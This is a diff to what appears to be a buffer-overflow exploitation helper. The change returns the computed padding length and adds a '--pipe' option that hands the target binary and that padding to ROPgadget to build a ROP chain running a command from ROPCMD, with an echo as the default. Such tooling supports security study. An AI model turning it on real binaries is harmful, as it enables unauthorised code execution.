@@ -1,6 +1,8 @@
 import subprocess
 import sys
 import argparse
+import ropgadget
+import os
 
 import re
 
@@ -139,7 +141,10 @@ def find_BOF(vulnerableFile, inputType):
 
         counter += 1
     
-    print("BoF Exploit Found!!!\nThe length of the padding is:", (counter - 1) * SIZE_OF_ADDRESS_IN_BYTES)
+    amount_of_padding = (counter - 1) * SIZE_OF_ADDRESS_IN_BYTES
+    print("BoF Exploit Found!!!\nThe length of the padding is:", amount_of_padding)
+    
+    return amount_of_padding
 
         
 def handle_args():
@@ -165,10 +170,12 @@ def handle_args():
     #parse.add_argumnet("-h", "--help", help)
 
     input_group = parser.add_mutually_exclusive_group()
-    input_group.add_argument("-f", "--file", help="Case where the vulnerable input is a file", action="store_true", default=False)
-    input_group.add_argument("-a", "--arg", help="Case where the vulnerable input is a cmd line argument", action="store_true", default=False)
-    input_group.add_argument("-i", "--stdin", help="Case where the vulnerable input is in STDIN ", action="store_true", default=False)
+    input_group.add_argument("-f", "--file", help="Case where the vulnerable input is a file.", action="store_true", default=False)
+    input_group.add_argument("-a", "--arg", help="Case where the vulnerable input is a cmd line argument.", action="store_true", default=False)
+    input_group.add_argument("-i", "--stdin", help="Case where the vulnerable input is in STDIN.", action="store_true", default=False)
 
+    parser.add_argument("-p", "--pipe", help="Pipe the padded information into ROPgadget.py so that we can create ropchain.", action="store_true", default=False)
+    
     args = parser.parse_args()
 
     print(args.filePath)
@@ -179,6 +186,13 @@ def main():
     args = handle_args()
     
     # Define input args here
-    find_BOF(args.filePath, InputTypes.FILE)
+    padding = find_BOF(args.filePath, InputTypes.FILE)
+
+    if (args.pipe):
+        cmd = os.environ.get("ROPCMD")
+        if (cmd is None):
+            cmd = "/bin/echo The exploit is working."
+        
+        ropgadget.main(cmd, ["--ropchain", "--binary", args.filePath], padding)
 
 main()
